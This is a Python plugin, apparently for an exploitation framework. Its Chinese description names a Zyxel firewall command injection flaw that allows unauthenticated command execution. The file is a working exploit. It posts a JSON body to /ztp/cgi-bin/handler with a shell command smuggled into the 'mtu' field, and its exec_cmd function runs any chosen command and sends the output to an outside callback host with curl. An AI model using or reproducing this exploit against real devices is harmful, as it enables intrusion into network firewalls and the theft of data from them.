# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "Zyxel 防火墙命令注入漏洞",
        "description": "该漏洞存在于某些Zyxel防火墙版本的 CGI 程序中，允许在未经身份验证的情况下在受影响设备上以nobody用户身份执行任意命令",
        "references": ["-"],
    }

    def url(self) -> dict:
        status = self.custom_exec_command("whoami")
        if status:
            return {"LoopholeInfo": self.__info__}

    def custom_exec_command(self, cmd):
        r = self.request(
            method='POST',
            path='./ztp/cgi-bin/handler',
            headers={
                "Content-Type": "application/json"
            },
            json={"command": "setWanPortSt", "proto": "dhcp", "port": "4", "vlan_tagged": "1", "vlanid": "5",
                  "mtu": f";{cmd};", "data": "hi"}
        )
        if r.status_code == 500:
            return True
        return False

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        with self.echo_query() as execute:
            http_url = execute.get_url()
            self.request(
                method='POST',
                url=urllib.parse.urljoin(url, './ztp/cgi-bin/handler'),
                headers={
                    "Content-Type": "application/json"
                },
                json={"command": "setWanPortSt", "proto": "dhcp", "port": "4", "vlan_tagged": "1", "vlanid": "5",
                      "mtu": f";curl {http_url} -d `{cmd}`;", "data": "hi"}
            )
            if execute.verify():
                return execute.result()
